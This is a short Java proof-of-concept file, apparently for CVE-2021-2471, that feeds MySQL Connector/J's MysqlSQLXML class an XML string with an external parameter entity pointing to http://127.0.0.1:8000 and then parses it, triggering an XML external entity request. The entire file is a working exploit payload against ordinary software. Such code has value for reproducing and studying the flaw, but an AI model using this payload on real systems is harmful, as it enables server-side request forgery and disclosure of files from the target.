package mysql;

import java.sql.SQLException;
import javax.xml.transform.dom.DOMSource;
import com.mysql.cj.jdbc.MysqlSQLXML;

public class CVE_2021_2471 {
    public static void main(String[] args) throws SQLException {
        MysqlSQLXML myXML = new MysqlSQLXML(null);
        myXML.setString("<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://127.0.0.1:8000\"> %xxe;]>");
        myXML.getSource(DOMSource.class);
    }
}
